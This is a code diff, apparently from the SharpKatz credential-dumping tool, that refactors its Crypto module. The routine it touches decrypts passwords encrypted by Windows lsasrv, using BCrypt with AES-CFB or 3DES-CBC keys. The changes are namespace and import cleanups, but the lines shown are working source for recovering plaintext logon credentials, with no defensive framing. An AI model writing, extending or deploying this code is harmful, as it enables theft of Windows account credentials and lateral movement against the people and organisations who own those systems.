@@ -1,13 +1,10 @@
 ﻿using Microsoft.Win32.SafeHandles;
 using System;
-using System.Collections.Generic;
-using System.Linq;
 using System.Runtime.ConstrainedExecution;
 using System.Runtime.InteropServices;
 using System.Security;
-using System.Text;
-using System.Threading.Tasks;
-using static SharpKatz.Natives;
+using static SharpKatz.Win32.Natives;
+using static SharpKatz.Crypto.Natives;
 
 namespace SharpKatz.Crypto
 {
@@ -22,7 +19,7 @@ namespace SharpKatz.Crypto
 
         protected override bool ReleaseHandle()
         {
-            return Natives.BCryptCloseAlgorithmProvider(handle, 0) == NTSTATUS.Success;
+            return BCryptCloseAlgorithmProvider(handle, 0) == NTSTATUS.Success;
         }
     }
 
@@ -36,7 +33,7 @@ namespace SharpKatz.Crypto
         [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
         protected override bool ReleaseHandle()
         {
-            return Natives.BCryptDestroyKey(handle) == NTSTATUS.Success;
+            return BCryptDestroyKey(handle) == NTSTATUS.Success;
         }
     }
 
@@ -60,8 +57,8 @@ namespace SharpKatz.Crypto
             if ((encrypedPass.Length % 8) != 0)
             {
                 // If suited to AES, lsasrv uses AES in CFB mode
-                Natives.BCryptOpenAlgorithmProvider(out hProvider, Natives.BCRYPT_AES_ALGORITHM, null, 0);
-                Natives.BCryptSetProperty(hProvider, Natives.BCRYPT_CHAINING_MODE, Natives.BCRYPT_CHAIN_MODE_CFB, Natives.BCRYPT_CHAIN_MODE_CFB.Length, 0);
+                BCryptOpenAlgorithmProvider(out hProvider, BCRYPT_AES_ALGORITHM, null, 0);
+                BCryptSetProperty(hProvider, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_CFB, BCRYPT_CHAIN_MODE_CFB.Length, 0);
 
                 GCHandle pkeypinnedArray = GCHandle.Alloc(aeskey, GCHandleType.Pinned);
                 IntPtr pkey = pkeypinnedArray.AddrOfPinnedObject();
@@ -75,8 +72,8 @@ namespace SharpKatz.Crypto
                 GCHandle ppassDecryptedinnedArray = GCHandle.Alloc(passDecrypted, GCHandleType.Pinned);
                 IntPtr ppassDecrypted = ppassDecryptedinnedArray.AddrOfPinnedObject();
 
-                Natives.BCryptGenerateSymmetricKey(hProvider, out hAes, IntPtr.Zero, 0, pkey, aeskey.Length, 0);
-                status = Natives.BCryptDecrypt(hAes, pencrypedPass, encrypedPass.Length, IntPtr.Zero, pinitializationVector, IV.Length, ppassDecrypted, passDecrypted.Length, out result, 0);
+                BCryptGenerateSymmetricKey(hProvider, out hAes, IntPtr.Zero, 0, pkey, aeskey.Length, 0);
+                status = BCryptDecrypt(hAes, pencrypedPass, encrypedPass.Length, IntPtr.Zero, pinitializationVector, IV.Length, ppassDecrypted, passDecrypted.Length, out result, 0);
                 if (status != 0)
                 {
                     return null;
@@ -86,8 +83,8 @@ namespace SharpKatz.Crypto
             else
             {
                 // If suited to 3DES, lsasrv uses 3DES in CBC mode
-                Natives.BCryptOpenAlgorithmProvider(out hDesProvider, Natives.BCRYPT_3DES_ALGORITHM, null, 0);
-                Natives.BCryptSetProperty(hDesProvider, Natives.BCRYPT_CHAINING_MODE, Natives.BCRYPT_CHAIN_MODE_CBC, Natives.BCRYPT_CHAIN_MODE_CBC.Length, 0);
+                BCryptOpenAlgorithmProvider(out hDesProvider, BCRYPT_3DES_ALGORITHM, null, 0);
+                BCryptSetProperty(hDesProvider, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_CBC, BCRYPT_CHAIN_MODE_CBC.Length, 0);
 
                 GCHandle pkeypinnedArray = GCHandle.Alloc(deskey, GCHandleType.Pinned);
                 IntPtr pkey = pkeypinnedArray.AddrOfPinnedObject();
@@ -101,8 +98,8 @@ namespace SharpKatz.Crypto
                 GCHandle ppassDecryptedinnedArray = GCHandle.Alloc(passDecrypted, GCHandleType.Pinned);
                 IntPtr ppassDecrypted = ppassDecryptedinnedArray.AddrOfPinnedObject();
 
-                Natives.BCryptGenerateSymmetricKey(hDesProvider, out hDes, IntPtr.Zero, 0, pkey, deskey.Length, 0);
-                status = Natives.BCryptDecrypt(hDes, pencrypedPass, encrypedPass.Length, IntPtr.Zero, pinitializationVector, 8, ppassDecrypted, passDecrypted.Length, out result, 0);
+                BCryptGenerateSymmetricKey(hDesProvider, out hDes, IntPtr.Zero, 0, pkey, deskey.Length, 0);
+                status = BCryptDecrypt(hDes, pencrypedPass, encrypedPass.Length, IntPtr.Zero, pinitializationVector, 8, ppassDecrypted, passDecrypted.Length, out result, 0);
                 if (status != 0)
                 {
                     return null;
